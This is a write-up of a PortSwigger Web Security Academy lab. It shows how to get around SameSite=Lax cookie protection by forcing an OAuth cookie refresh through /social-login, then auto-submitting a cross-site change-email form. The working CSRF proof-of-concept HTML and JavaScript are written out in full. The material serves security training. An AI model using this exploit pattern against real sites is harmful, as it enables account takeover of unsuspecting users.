# Getting Around SameSite=Lax Using a Cookie Refresh

The change-email function is vulnerable to CSRF. The objective is to craft a CSRF attack, hosted on the exploit server, that changes the victim's email.

This lab supports OAuth login. You can sign in through a social media account with: wiener:peter

Note: SameSite cookie defaults vary by browser. Since the victim is simulated as using Chrome, it's best to test the exploit in Chrome too (or Burp's bundled Chromium browser).

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

Browsers typically block popups unless they're triggered by a genuine user action like a click. Since the victim is expected to click somewhere on the page you send them, you can rig up a popup using a global click handler like this:

```
<script>
    window.onclick = () => {
        window.open('about:blank')
    }
</script>
```

PortSwigger's documentation notes that completing an OAuth login flow can generate a fresh session every time, since the OAuth provider has no way of knowing whether the user is already authenticated on the target site. So the challenge is finding a way to trigger this OAuth flow without knowing the victim's `client_id`.

Looking closer at the requests, it turns out that visiting `/social-login` while already logged in generates a brand-new session:

Taking the PoC Burp generated for the email-update POST request, I added logic so that clicking triggers a visit to `/social-login`, waits 10 seconds, and then submits the form:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a72005004831ac38087729700fb0018.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test77&#64;test&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
	    window.onclick = () => {
	        window.open('https://0a72005004831ac38087729700fb0018.web-security-academy.net/social-login');
            setTimeout(submit, 10000);
			function submit(){			
				history.pushState('', '', '/');
		  		document.forms[0].submit();    	
      		}
	    }      
    </script>
  </body>
</html>
```
